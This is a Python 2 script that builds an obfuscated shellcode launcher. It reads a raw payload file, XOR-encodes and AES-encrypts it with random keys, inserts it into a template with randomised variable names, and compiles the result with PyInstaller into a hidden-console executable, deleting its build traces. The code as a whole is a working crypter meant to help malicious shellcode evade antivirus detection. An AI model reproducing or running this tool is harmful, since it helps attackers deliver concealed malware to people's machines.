# Limitations: Does not work for 64 bit at this time, Also, Only Python2
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import random
import string
import binascii
from itertools import cycle,izip
import subprocess
import os
import shutil

arch = 'x86' # do x64 for 64 bit
payload_file = "payload.bin" # Shellcode filename
outfile = "out.py" # Output file
pad = lambda s,p: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
#unpad = lambda s,p : s[0:-ord(s[-1])]

def randomString(stringLength=random.choice(range(5, random.choice(range(10,25))))):
	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
	return str(random.choice(string.ascii_lowercase + string.ascii_uppercase) + ''.join(random.choice(letters) for i in range(stringLength))).strip()

def bin_to_hex(payload_file):
	file = open(payload_file,'rb').read()
	data = str(binascii.hexlify(file))
	return data

def xor(binary,key):
    return base64.b64encode(''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(binary,cycle(key))))

# def xor_decode(data,key):
    # return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(list(b64decode(data)),cycle(key)))

class AESCipher:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode('utf8')).digest()
        self.bs = AES.block_size

    def encrypt(self, data):
        iv = get_random_bytes(AES.block_size)
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'), AES.block_size)))

    # def decrypt(self, data):
    #     raw = base64.b64decode(data)
    #     self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
    #     return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)

def prepare_payload(payload):
	key = randomString(stringLength=31)
	xorkey = randomString(stringLength=random.choice(range(40, random.choice(range(50,100)))))
	cipher = AESCipher(key=key)
	return cipher.encrypt(xor(payload, xorkey)), key, xorkey

hexdata = bin_to_hex(payload_file)
template = open('python_%s_template.py' % arch, 'r').read()
i = 1
while i < 50:
	template = template.replace("---VAR%d---" % i, randomString(stringLength=random.choice(range(5, random.choice(range(10,25))))))
	i = i + 1

payload, key, xorkey = prepare_payload(hexdata[::-1])


template = template.replace("---PAYLOAD---", payload)
template = template.replace("---CIPHER---", key)
template = template.replace("---XORKEY---", xorkey)

open(outfile,'w').write(template)
subprocess.check_output('pyinstaller -F %s --noconsole --clean --distpath .\\' % outfile)
shutil.rmtree('build')
os.remove((outfile.split('.')[0] + '.spec'))
os.remove(outfile)